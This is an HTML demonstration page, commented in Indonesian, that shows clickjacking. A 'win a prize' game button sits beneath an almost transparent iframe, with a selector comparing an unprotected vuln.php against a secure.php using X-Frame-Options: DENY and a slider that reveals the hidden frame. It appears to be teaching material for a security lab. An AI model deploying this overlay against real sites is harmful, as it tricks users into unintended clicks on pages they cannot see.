<!DOCTYPE html>
<html>
<head>
    <title>Game Gratis 2026!</title>
    <style>
        body { margin: 0; padding: 0; text-align: center; font-family: sans-serif; background: #0f172a; color: white; }
        .game-container { position: relative; width: 600px; height: 400px; margin: 50px auto; background: url('https://images.unsplash.com/photo-1550745165-9bc0b252726f?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80') center/cover; }
        .win-btn {
            position: absolute; top: 200px; left: 160px;
            background: #22c55e; color: white; padding: 15px 30px; font-size: 1.2rem;
            border: none; border-radius: 5px; cursor: pointer; pointer-events: none;
        }
        
        /* Iframe transparan untuk mengelabui korban */
        iframe {
            position: absolute; top: 0; left: 0;
            width: 100%; height: 100%;
            opacity: 0.001; /* Dibuat hampir tidak terlihat */
            z-index: 10;
        }

        .opacity-control { margin-top: 20px; }
        .target-switcher { margin-bottom: 20px; background: #1e293b; padding: 10px; border-radius: 8px; display: inline-block; }
        .target-switcher select { padding: 5px 10px; font-size: 1rem; border-radius: 4px; }
    </style>
</head>
<body>
    <h1>🎮 Mainkan Game Ini dan Menangkan Hadiah!</h1>
    
    <div class="target-switcher">
        <label>Pilih Target Iframe:</label>
        <select onchange="document.getElementById('targetFrame').src = this.value;">
            <option value="vuln.php">🔴 vuln.php (Tanpa Proteksi)</option>
            <option value="secure.php">🟢 secure.php (X-Frame-Options: DENY)</option>
        </select>
    </div>
    
    <div class="game-container">
        <!-- Tombol palsu yang terlihat oleh korban -->
        <button class="win-btn">KLIK DISINI UNTUK MENANG!</button>

        <!-- Iframe asli yang menimpa tombol palsu -->
        <iframe src="vuln.php" id="targetFrame"></iframe>
    </div>

    <div class="opacity-control">
        <label>Sesuaikan Opacity (Untuk Demo):</label>
        <input type="range" min="0" max="1" step="0.1" value="0.001" oninput="document.getElementById('targetFrame').style.opacity = this.value;">
        <p><i>Ubah slider ke kanan untuk melihat halaman asli yang disembunyikan</i></p>
    </div>
</body>
</html>
